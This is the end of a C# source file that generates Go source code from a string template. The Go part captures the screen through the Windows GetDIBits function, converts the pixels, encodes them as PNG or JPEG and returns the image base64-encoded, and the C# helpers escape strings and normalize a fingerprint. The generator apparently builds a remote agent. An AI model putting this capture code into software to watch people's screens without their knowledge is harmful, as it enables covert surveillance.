    getDIBits.Call(hdcMem, hBitmap, 0, uintptr(height),
        uintptr(unsafe.Pointer(&pixelData[0])),
        uintptr(unsafe.Pointer(&bmi)),
        0)

    img := image.NewRGBA(image.Rect(0, 0, width, height))
    for y := 0; y < height; y++ {{
        for x := 0; x < width; x++ {{
            srcIdx := y*stride + x*4
            dstIdx := y*img.Stride + x*4
            img.Pix[dstIdx+0] = pixelData[srcIdx+2]
            img.Pix[dstIdx+1] = pixelData[srcIdx+1]
            img.Pix[dstIdx+2] = pixelData[srcIdx+0]
            img.Pix[dstIdx+3] = 255
        }}
    }}

    var buf bytes.Buffer
    if quality >= 90 {{
        err = png.Encode(&buf, img)
    }} else {{
        err = jpeg.Encode(&buf, img, &jpeg.Options{{Quality: quality}})
    }}
    if err != nil {{
        return """", fmt.Errorf(""encode failed: %w"", err)
    }}

    return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}}

";
            return src;
        }

        private static string EscapeGoString(string value)
        {
            return value.Replace("\\", "\\\\").Replace("\"", "\\\"");
        }

        private static string NormalizeFingerprint(string value)
        {
            if (string.IsNullOrWhiteSpace(value))
            {
                return string.Empty;
            }

            return value.Replace(":", string.Empty).Replace(" ", string.Empty).Trim();
        }
    }
}
